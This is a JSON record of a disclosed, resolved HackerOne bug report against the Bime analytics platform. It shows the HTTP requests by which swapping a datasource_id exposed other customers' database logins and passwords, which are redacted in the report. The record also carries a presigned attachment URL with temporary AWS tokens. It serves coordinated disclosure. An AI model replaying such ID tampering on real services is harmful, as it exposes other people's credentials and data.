@@ -1,0 +1,195 @@
+{
+  "id": 149907,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDk5MDc=",
+  "url": "https://hackerone.com/reports/149907",
+  "title": "Urgent: attacker can access every data source on Bime",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-08T03:53:26.690Z",
+  "submitted_at": "2016-07-08T03:53:26.690Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7068,
+    "url": "https://hackerone.com/bime",
+    "handle": "bime",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/068/046bc25f4f1f4c11ec1da9b821f0c112f4ab33e5_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/068/046bc25f4f1f4c11ec1da9b821f0c112f4ab33e5_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Bime",
+      "twitter_handle": "",
+      "website": "https://www.bimeanalytics.com",
+      "about": "BIME allows customers to import data, create various queries, and view customizable dashboards - all within BIME's beautifully intuitive interface."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-07-27T15:00:35.144Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-07-15T22:01:38.211Z",
+  "team_member_agreed_on_going_public_at": "2016-07-27T15:00:35.052Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Vulnerability details\nI don't include words like \"urgent\" in my title very often, but I thought you might want to get onto this right away. An attacker can access the data source of any other customer on the BIME platform through the `/cube_models.json` endpoint. This leaks, for example, the login information of Postgres backends (including hostname, login, and passwords). I haven't verified whether the passwords are encrypted, but this seems pretty bad nevertheless.\n\n# Proof of concept\nSign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. I added a CSV as data source to set up a new dashboard. During this flow, the following request is sent to the server:\n\n```\nPOST /cube_models.json HTTP/1.1\nHost: h1-bugbounty.bime.io\n...\n\n{\"import_strategy\":\"replace\",\"configuration\":\"{\\\"bimeDb\\\":{\\\"arrayVarcharLength\\\":500,\\\"numberOfDecimals\\\":2},\\\"queryBlender\\\":{\\\"pushdown\\\":true,\\\"raiseWarnings\\\":true},\\\"infiniteCache\\\":{},\\\"timeZone\\\":\\\"\\\",\\\"mergeFields\\\":\\\"\\\",\\\"schedule\\\":{\\\"cronExp\\\":\\\"0 0 0 * * ?\\\",\\\"cronText\\\":\\\"Every day at 00 : 00\\\",\\\"emailOnSuccess\\\":false,\\\"emailOnFailure\\\":false,\\\"refreshRate\\\":\\\"importNow\\\"},\\\"bundle\\\":{},\\\"sortWeekdayFromMonday\\\":true}\",\"model_category_id\":527921,\"name\":\"CSV Connection 1\",\"cache_type\":\"dejaVu\",\"use_cache\":true,\"datasource_id\":723592,\"technical_type\":\"filePicker\",\"in_memory_cache_time_to_live\":15,\"cube_schema\":\"PE9MQVBTY2hlbWEgZm9sZGVycz0iZXlKaGRIUnlhV0oxZEdWelJtOXNaR1Z5Y3lJNlcxMHNJbTFsWVhOMWNtVnpSbTlzWkdWeWN5STZXMTBzSW0xbFlYTjFjbVZ6Um05c1pHVnljMFJwYzNCc1lYbEdiM0p0WVhSeklqcGJYWDA9IiBsYWJlbD0iY3N2Y29ubmVjdGlvbjEtYmU2ODgiIGlzTGFyZ2VNb2RlbD0iZmFsc2UiIGFycmF5Q29sdW1ucz0iVzEwPSIgPjxEaW1lbnNpb25zPjxEaW1lbnNpb24gbGFiZWw9IkF4aXMgb2YgYW5hbHlzaXMiIGRpc3BsYXlOYW1lPSJBeGlzIG9mIGFuYWx5c2lzIiBpZD0iQXhpcyBvZiBhbmFseXNpcyI+PEF0dHJpYnV0ZXM+PEF0dHJpYnV0ZSBsYWJlbD0iSUQiIGRlc2NyaXB0aW9uPSJJRCIgZGlzcGxheU5hbWU9IklEIiBmb2xkZXJJbmRleD0iMCIgb3JpZ2luYWxEaXNwbGF5TmFtZT0iSUQiIHJlYWxUeXBlPSJtZWFzdXJlIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjxBdHRyaWJ1dGUgbGFiZWw9InRpdGxlIiBkZXNjcmlwdGlvbj0idGl0bGUiIGRpc3BsYXlOYW1lPSJ0aXRsZSIgZm9sZGVySW5kZXg9IjAiIG9yaWdpbmFsRGlzcGxheU5hbWU9InRpdGxlIiByZWFsVHlwZT0iY3VzdG9tIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjwvQXR0cmlidXRlcz48L0RpbWVuc2lvbj48L0RpbWVuc2lvbnM+PE1lYXN1cmVzIGRpc3BsYXlGb3JtYXQ9InN0YW5kYXJkX1dBQ18wX1dBQ18xMDAwX1dBQ19fV0FDX19XQUNfLl9XQUNfIF9XQUNfMV9XQUNfIj48L01lYXN1cmVzPjxDYWxjdWxhdGVkRmllbGRzPjxDYWxjdWxhdGVkTWVhc3VyZXM+PC9DYWxjdWxhdGVkTWVhc3VyZXM+PENhbGN1bGF0ZWRBdHRyaWJ1dGVzPjwvQ2FsY3VsYXRlZEF0dHJpYnV0ZXM+PC9DYWxjdWxhdGVkRmllbGRzPjwvT0xBUFNjaGVtYT4=\"}\n```\n\nNotice the `datasource_id` in this request. Send this request to the server again, but this time, change the ID to the data source that you want to access. You don't need to know the actual type of the datasource. After this, send a `GET` request to the `/datasources.json` endpoint, like shown below.\n\n```\nGET /datasources.json HTTP/1.1\nHost: h1-bugbounty.bime.io\n...\n```\n\n```\nHTTP/1.1 200 OK\n...\n\n[...\n{\n  \"id\": 723591,\n  \"technical_type\": \"Relational Databases\",\n  \"external_id\": \"█████████.db.databaselabs.io\",\n  \"login\": \"bot\",\n  \"email\": null,\n  \"tocken\": \"true\",\n  \"url\": \"█████████\",\n  \"public_key\": \"customSQL\",\n  \"private_key\": \"true\",\n  \"extra_param1_name\": \"dbPort\",\n  \"extra_param1_value\": \"5432\",\n  \"extra_param2_name\": null,\n  \"extra_param2_value\": \"postgreSQL\",\n  \"extra_param3_name\": null,\n  \"extra_param3_value\": \"██████████\",\n  \"created_at\": \"2016-07-08T03:09:29.000Z\",\n  \"updated_at\": \"2016-07-08T03:35:36.000Z\",\n  \"datasource_version\": 2,\n  \"configuration\": \"{\\\"invalidDateAs\\\":\\\"null\\\",\\\"meta\\\":{\\\"useReusableToken\\\":true},\\\"cloudStorage\\\":{\\\"bigQuery\\\":{},\\\"redshift\\\":{\\\"useEscapingV2\\\":true},\\\"useEscapingV2\\\":true},\\\"sqlServerLocale\\\":\\\"english\\\",\\\"union\\\":{},\\\"useBifeV2\\\":true,\\\"sqlVersion\\\":2,\\\"joinCulling\\\":true,\\\"usePushDown\\\":true,\\\"jdbcParameters\\\":[],\\\"useCache\\\":false}\",\n  \"final_type\": \"postgresql\",\n  \"pwd\": \"██████████\"\n},\n...]\n```\n\nThis will give the attacker access to every datasource on the BIME platform. It'll also be reflected on the datasources page, when signed in to the platform:\n\n{F103801}\n\nLet me know if you need more information.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 103801,
+      "file_name": "Screen_Shot_2016-07-07_at_20.39.52.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/103/801/ed5ca652c3610931349e4838fcd165c8eb04e8fc/Screen_Shot_2016-07-07_at_20.39.52.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-07-07_at_20.39.52.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-07-07_at_20.39.52.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUBZL3SMZ%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065602Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC0vd9qwWGGlJ5R6u1w%2FJDTEgxnnEX%2F66Z0y%2FDYDIrKogIhAMmNkpSlsAfDjpOMsGnPN%2FfULnz8pf6lMWaQAHeNhfKJKrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgysijxSd9ouNs36KaUqjwUD0hBxjr%2FslcqCGno5SyyxVHX7ZsWXMYXblgWRxlnYMv2sVGB7P0GPCL0Q%2BgNF9E2XuWdW1Q7EIfU9Dun6GivHAYADWtlEnvYCmCnArQPyewGkBRHPJ8s1dmAAWer7c2sEs4jy0PxKNKQGcov0hq2jTDCUo%2Baxi2sz5MpKAjnC26Da1Lr%2B29NQjvWcBTyJCUUR3NvkN2UD44OL1wXIoV3JYeLh2x8qh0GJTWHkxerxRxME1IunjIshD5fjFlc2LQM16pi%2Bjs8sPolrf4lWgWM8D7ivQPEo%2Fq8gbt24Qrs8XDlERppmJmz%2FuYOSN2gqmaAyzD7Eu6o88%2Fpu9GBkda7RjG2%2FCX8%2B76t07zz1UTAh1MYxOc4lcY%2BYvJKWzz%2F8DNoBlvcA1mVFaW9NQeZhsm8XpdUdVqiXvwfyBYHVqPrN%2FBFewhyIuyjkeF17nWyCfSJn6tz%2BXH83FAEYHY67r2Tlp5F9wfBDWaW5gbxZLaWnjOAGJPmHFup%2FuQBSQYqhHGHcM%2FXT2hdZTxiRiQq4wFVhRrrzrpEaVb771%2B%2FwEBg%2Bs1NrFFBa1hzy%2F5oLOHVpk7GBIHJVVqrFgrFlXH8z7K4hNHvcvf5KSU97hLPE2OM1n%2FgozkWNSYh%2BTeGv0dmhM1Di32Gs1TLuJmfracd2zO5tcfL9U1dLR02F6OmtFvx7B8Yo1I5ahbvv%2BiKK25akKqT%2BOuQCGkxOTfmMlZ1Gw0lQ7fMj0H%2B9w%2FIZhy%2Bah9OqcwEvuaBGJ62GpNpR2Vw79O1TWtybkP9SWj8EHrrG96oEMkfdfRQURtwWNVSc4Dnp7iRVTNkAJW5jIObwNohK9qnON8iRS9V6tRlAicG3ZcWtZQ3kutBiP9fP4TJX9rJ2MKzLt9IGOrABTXz5zSXYJEpkSFwGSgTe1z%2FJz01I3KATBTQ6qV3JoMW0ktzuiCH6rDLfhJ04qfCeEzmk4cPqSGYcJOpIMMuV0dt2InOF37EP678V1J3jqnTxHbtFOaQb7MJ%2B1UPOJS6i9bjMKau8QswoHyj1vXaaMa7ZBAIWnLRcJhPFHp3frrjOemsArtrg4fkriDp4mPK3xZgX9iLmty2VPJFjfO407HcC0pNZ0WHeauSCnSAk6v8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=70ad88fe28c4059c2eb1803a851c7e1125f7790367b475d6ab84447ec7d9bad6",
+      "file_size": 64878,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-08-14T22:01:38.374Z",
+  "allow_singular_disclosure_after": -312281663.75637865,
+  "singular_disclosure_allowed": true,
+  "vote_count": 56,
+  "voters": [
+    "wargsec",
+    "sameoldstory",
+    "inhibitor181",
+    "bogdantc",
+    "shailesh4594",
+    "niemand_sec",
+    "sameerphad72",
+    "michiel",
+    "dawgyg",
+    "thalaivar304",
+    "and 46 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "149907",
+  "votes": 56,
+  "latest_disclosable_activity_at": "2016-07-27T15:00:35.181Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:56:02.230074",
+    "source": "https://hackerone.com/reports/149907.json",
+    "report_id": 149907
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDk5MDc=",
+    "databaseId": "149907",
+    "title": "Urgent: attacker can access every data source on Bime",
+    "url": "https://hackerone.com/reports/149907",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-07-27T15:00:35.144Z",
+    "created_at": "2016-07-08T03:53:26.690Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "jobert"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzcwNjg=",
+      "handle": "bime",
+      "name": "Bime",
+      "url": "https://hackerone.com/bime",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8zMDAxMA==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-07-09T17:01:07.136Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE0OTkwNw==",
+    "_id": "149907",
+    "disclosed": true,
+    "votes": 56,
+    "latest_disclosable_activity_at": "2016-07-27T15:00:35.181Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDk5MDc=",
+      "databaseId": "149907",
+      "title": "Urgent: attacker can access every data source on Bime",
+      "url": "https://hackerone.com/reports/149907",
+      "disclosed_at": "2016-07-27T15:00:35.144Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzcwNjg=",
+      "handle": "bime",
+      "name": "Bime",
+      "url": "https://hackerone.com/bime",
+      "currency": "usd"
+    }
+  }
+}
